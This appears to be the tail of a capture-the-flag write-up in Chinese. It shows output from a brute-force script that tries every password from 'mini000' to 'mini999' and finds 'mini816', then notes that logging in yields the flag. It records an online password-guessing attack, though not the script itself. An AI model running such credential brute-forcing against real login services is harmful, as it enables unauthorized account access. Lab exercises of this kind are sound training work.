[+] 开始生成以 'mini' 开头的密码组合...
[+] 尝试 mini + 3位数字组合 (mini000 -> mini999)
[-] 正在尝试密码: mini863
[+] 可能找到正确密码: mini816
[+] 响应状态码: 200
[+] Location头: None
[+] 响应内容长度: 64


[+] ====================================
[+] ✨ 密码找到! ✨: mini816
[+] ====================================
```

登陆就送flag.
